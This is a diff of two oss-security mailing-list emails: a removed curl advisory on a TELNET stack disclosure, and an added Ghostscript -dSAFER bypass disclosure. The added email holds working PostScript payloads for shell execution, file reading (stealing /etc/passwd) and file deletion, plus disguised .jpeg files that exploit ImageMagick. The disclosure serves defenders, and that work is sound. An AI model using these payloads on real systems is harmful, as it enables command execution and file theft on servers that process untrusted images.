@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2846" "Wednesday" "26" "May" "2021" "08:44:02" "+0200" "Daniel Stenberg" "daniel@haxx.se" nil "98" "[oss-security] [SECURITY ADVISORY] curl: TELNET stack contents disclosure" nil nil nil "5" nil nil (number mark "U       daniel@haxx. May 26   98/2846  " thread-indent "\"[oss-security] [SECURITY ADVISORY] curl: TELNET stack contents disclosure\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [SECURITY ADVISORY] curl: TELNET stack contents disclosure" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6114" "Tuesday" "21" "August" "2018" "05:46:26" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>" "178" "[oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "8" "2018082112:46:26" "[oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Aug 21  178/6114  " thread-indent "\"[oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 20467 invoked by uid 550); 26 May 2021 06:44:14 -0000
+Received: (qmail 28495 invoked by uid 550); 21 Aug 2018 12:46:50 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,116 +11,216 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 20434 invoked from network); 26 May 2021 06:44:14 -0000
-Date: Wed, 26 May 2021 08:44:02 +0200 (CEST)
-From: Daniel Stenberg <daniel@haxx.se>
-X-X-Sender: dast@silly
-To: curl security announcements -- curl users <curl-users@cool.haxx.se>, 
-    curl-announce@cool.haxx.se, libcurl hacking <curl-library@cool.haxx.se>, 
-    oss-security@lists.openwall.com
-Message-ID: <nycvar.QRO.7.76.2105260043330.26381@fvyyl>
-User-Agent: Alpine 2.21 (DEB 202 2017-01-01)
-X-fromdanielhimself: yes
+Received: (qmail 28461 invoked from network); 21 Aug 2018 12:46:50 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=ZT2gIwyhe9tnN6XTu9TENoo7PA/5I5+YCSW0ju7vi34=;
+        b=j3qtE+b+UUgg3vFmJjQnODHRs7pwhx2ljom7fYD49G2k2P4UgBBdRcurrxiTB+tT15
+         PTQEzjR53Pgx/a+jGKJIJ9YH2vR5OC1t6apOzt6lzGOOep8ZRFMwrRQXG9oGma9Jwo+4
+         YrYrAuYD1fiicFAuIQaPtNR7OFndPbDuZYrqdr4th5xWQQhq2IO/pX1joFlrrgqibBTH
+         5DogioGZs9hiTP5MNVWGhx2U0tImDHyy12zHITqwZPE+CnEs+lLjXGIcrHtNPqY27BwT
+         qQMge0hXcy0R1UXQuB0aDHhdNbqERVEsZgqN0ddZ8XKWvAT/8Y2yYAJYkHq6nMIgEypf
+         jfww==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=ZT2gIwyhe9tnN6XTu9TENoo7PA/5I5+YCSW0ju7vi34=;
+        b=q8HiN71Idl8TAYelmltab7wQ5LSBS2NHsscaxYzWLqOWO80SnIhyaBIuay7GvY6WMn
+         DNDpRpieNZYMs4dVi+IbcPeHzHPOIFWRBQlHBs2TnRewT7VQKVDPffJ08q1eFhbd8QtX
+         2n7YRuq44P2nmiGc7XMP4IVNv6tZbUPwMq9Z+fv3C9B1NViEJq8tqVq/OvBZwNZOOGzR
+         gOqoIolJEHvvHJs03ApQiz1Uej4u6CAzBIZfFdfkucDcxXWKxUau+HKqLj0yVowYxQoc
+         +OQvO+ZOiJ07Ee9Rx/iXgIPjhmo4KVI4Fc+d0vkfk/0kqQKlN1L7Uuqnq4TvuNpXqynA
+         8clQ==
+X-Gm-Message-State: AOUpUlGCpya39U1CbKyvBDAM/FTAPxJtqHwHvguM6C5OjZ6ige4GuLob
+	2sfxDklw1O9AkhQ9VjE6+SIai7PESky2UiiWeqOT9501LTg=
+X-Google-Smtp-Source: AA+uWPwNHEbOrlQZNk+f2p+rKfFGwH9k/Wa3SK7hnxKoKd/s2czR5ydXTTnO9PQJ55UikHt5Ga8dd3/tOmNth5Yrsko=
+X-Received: by 2002:ac8:c86:: with SMTP id n6-v6mr47590946qti.324.1534855597312;
+ Tue, 21 Aug 2018 05:46:37 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-Subject: [oss-security] [SECURITY ADVISORY] curl: TELNET stack contents disclosure
+Message-ID: <CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>
+Content-Type: multipart/alternative; boundary="000000000000a969ed0573f16a64"
+Date: Tue, 21 Aug 2018 05:46:26 -0700
+From: Tavis Ormandy <taviso@google.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
+To: oss-security@lists.openwall.com
 
-TELNET stack contents disclosure
-================================
+--000000000000a969ed0573f16a64
+Content-Type: text/plain; charset="UTF-8"
 
-Project curl Security Advisory, May 26th 2021 -
-[Permalink](https://curl.se/docs/CVE-2021-22898.html)
+Hello, this was discussed on the distros list, but it was suggested to move
+discussion to oss-security.
 
-VULNERABILITY
--------------
+You might recall I posted a bunch of -dSAFER sandbox escapes in ghostscript
+a few years ago:
 
-curl supports the `-t` command line option, known as `CURLOPT_TELNETOPTIONS`
-in libcurl. This rarely used option is used to send variable=content pairs to
-TELNET servers.
+http://seclists.org/oss-sec/2016/q4/29
 
-Due to flaw in the option parser for sending `NEW_ENV` variables, libcurl
-could be made to pass on uninitialized data from a stack based buffer to the
-server. Therefore potentially revealing sensitive internal information to the
-server using a clear-text network protocol.
+I found a few file disclosure, shell command execution, memory corruption
+and type confusion bugs. There was also one that was found exploited in the
+wild <http://ghostbutt.com/>. There was also a similar widely exploited
+issue <https://imagetragick.com/> that could be exploited identically.
 
-This could happen because curl did not check the return code from a
-`sscanf(command, "%127[^,],%127s")` function invoke correctly, and would leave
-the piece of the send buffer uninitialized for the value part if it was
-provided longer than 127 bytes. The buffer used for this is 2048 bytes big and
-the *variable* part of the *variable=content* pairs would be stored correctly
-in the send buffer, making curl sending "interleaved" bytes sequences of stack
-contents. A single curl TELNET handshake could then be made to send off a
-total of around 1800 bytes of (non-contiguous) stack contents in this style:
+TL;DR: I *strongly* suggest that distributions start disabling PS, EPS, PDF
+and XPS coders in policy.xml by default.
 
-     [control byte]name[control byte]
-     stack contents
-     [control byte]name[control byte]
-     stack contents
-     ...
+$ convert input.jpg output.gif
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
-An easy proof of concept command line looks like this:
+I've found a few more surprising ways to reach ghostscript recently, so
+went back to look again and found a few more.
 
-     curl telnet://example.com -tNEW_ENV=a,bbbbbb (256 'b's)
+1. /invalidaccess checks stop working after a failed restore, so you can
+just execute shell commands if you handle the error. Exploitation is very
+trivial. Repro:
 
-We are not aware of any exploit of this flaw.
+$ *gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null*
+GS>*legal*
+GS>*{ null restore } stopped { pop } if*
+GS>*legal*
+GS>*mark /OutputFile (%pipe%id) currentdevice putdeviceprops*
+GS<1>*showpage*
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
-INFO
-----
+(ImageMagick PoC at end of mail)
 
-This flaw has existed in curl since commit
-[a1d6ad2610](https://github.com/curl/curl/commit/a1d6ad2610) in libcurl 7.7,
-released on March 22, 2001.
+2. setcolor claims
+<http://git.ghostscript.com/?p=ghostpdl.git;a=blob;f=psi/zcolor.c;h=4c0f25827e320ceaa9b510c98f9b1926532a26d5;hb=HEAD#l263>
+no
+operand checking is necessary, because it's hidden behind a pseudo-operator
+of the same name. That's true, but you can still call it indirectly via
+setpattern, so type checking is necessary. Repro:
 
-The Common Vulnerabilities and Exposures (CVE) project has assigned the name
-CVE-2021-22898 to this issue.
+$ *gs -q -sDEVICE=ppmraw -dSAFER*
+GS>*<< /Whatever 16#414141414141 >> setpattern*
+Segmentation fault
 
-CWE-457: Use of Uninitialized Variable
+3. The LockDistillerParams boolean isn't type checked, so nice easy type
+confusion. Repro:
 
-Severity: Medium
+$ *gs -q -sDEVICE=ppmraw -dSAFER*
+GS>*<< /LockDistillerParams 16#4141414141414141 >> .setdistillerparams*
+Segmentation fault
 
-AFFECTED VERSIONS
------------------
 
-- Affected versions: curl 7.7 to and including 7.76.1
-- Not affected versions: curl < 7.7 and curl >= 7.77.0
+4. .tempfile permissions don't seem to work, I don't know when they broke.
+You're not supposed to be able to open files outside of the patterns in
+the  PermitFileReading array, but that doesn't seem to work for me e.g.:
+$
+*strace -fefile gs -sDEVICE=ppmraw -dSAFER*
+...
+GS>*(/proc/self/cwd/hello) (w) .tempfile*
+open("/proc/self/cwd/hello26E8LQ", O_RDWR|O_CREAT|O_EXCL, 0600) = 3
+GS<2>*dup*
+GS<3>*(hello) writestring*
+GS<2>*closefile*
 
-Also note that libcurl is used by many applications, and not always advertised
-as such.
+This means you can create a file in any directory (I don't think you can
+prevent the random suffix). Additionally, I have a trick to let you read
+and unlink any file you have permission to.
 
-THE SOLUTION
-------------
+Here is how to unlink() any file:
 
-Use sscanf() properly and only use properly filled-in buffers.
+$
+*strace -fefile gs -sDEVICE=ppmraw -dSAFER*
+...
+GS>*{ .bindnow } stopped {} if*
+GS>*(/etc/passwd) [] .tempfile*
+GS<2>*.quit*
+unlink("/etc/passwd")                   = -1 EACCES (Permission denied)
++++ exited with 0 +++
 
-A [fix for CVE-2021-22898](https://github.com/curl/curl/commit/39ce47f219b09c380b81f89fe54ac586c8db6bde)
+Reading is more complicated, because the best way I know how to do it is to
+interpret a file as as PostScript and catch the syntax errors, here is an
+example:
 
-RECOMMENDATIONS
---------------
+$ *cat fileread.ps <http://fileread.ps>*
+/FileToSteal (/etc/passwd) def
+errordict /undefinedfilename {
+    FileToSteal % save the undefined name
+} put
+errordict /undefined {
+    (STOLEN: ) print
+    counttomark {
+        ==only
+    } repeat
+    (\n) print
+    FileToSteal
+} put
+errordict /invalidfileaccess {
+    pop
+} put
+errordict /typecheck {
+    pop
+} put
+FileToSteal (w) .tempfile
+statusdict
+begin
+    1 1 .setpagesize
+end
+quit
+$ *gs -q -sDEVICE=ppmraw -dSAFER  fileread.ps <http://fileread.ps>*
+GPL Ghostscript 9.23:
+STOLEN: root:x:0:0:root:
+STOLEN: daemon:x:1:1:daemon:/bash/bin/root:(/etc/passwd)
+STOLEN: bin:x:2:2:bin:/nologin/sbin/usr/sbin:/usr(/etc/passwd)
+STOLEN: sys:x:3:3:sys:/nologin/sbin/usr/bin:(/etc/passwd)
+STOLEN: sync:x:4:65534:sync:/nologin/sbin/usr/dev:(/etc/passwd)
+STOLEN: games:x:5:60:games:/sync/bin/bin:(/etc/passwd)
 
-  A - Upgrade curl to version 7.77.0
+This can be used to steal arbitrary files from webservers that use
+ImageMagick by encoding file contents into the image output, see my
+previous PoC here <http://www.openwall.com/lists/oss-security/2016/09/29/3> for
+an example. i.e. You can make convert malicious.jpg thumbnail.jpg produce
+an image with the contents of a file visible.
 
-  B - Apply the patch to your local version
+These bugs were found manually, I also wrote a fuzzer and I'm working on
+minimizing a very large number of testcases that I'm planning to report
+over the next few days. I will just file those issues upstream and not post
+each individual one here, you can monitor https://bugs.ghostscript.com/ if
+you want to.  I expect there to be several dozen unique bugs.
 
-  C - Avoid using `CURLOPT_TELNETOPTIONS`
+In the meantime, I really *strongly* suggest that distributions start
+disabling PS, EPS, PDF and XPS coders in policy.xml by default. I think
+this is the number one "unexpected ghostscript" vector, imho this should
+happen asap. IMHO, -dSAFER is a fragile security boundary at the moment,
+and executing untrusted postscript should be discouraged, at least by
+default.
 
-TIMELINE
---------
+Please note, ImageMagick sends some initialization commands to ghostscript
+that breaks my minimal PoC, but you can just undo their changes in
+PostScript.
 
-This issue was reported to the curl project on April 27, 2021.
+This one works for me on the version in Ubuntu:
+$ *cat shellexec.jpeg*
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+$ *convert shellexec.jpeg whatever.gif*
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
-This advisory was posted on May 26, 2021.
+For CentOS, try this:
 
-CREDITS
--------
+$ *cat shellexec.jpeg*
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+$ *convert shellexec.jpeg whatever.gif*
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
-This issue was reported and patched by Harry Sintonen.
+Thanks, Tavis.
 
-Thanks a lot!
-
--- 
-
-  / daniel.haxx.se
-  | Commercial curl support up to 24x7 is available!
-  | Private help, bug fixes, support, ports, new features
-  | https://www.wolfssl.com/contact/
+--000000000000a969ed0573f16a64--
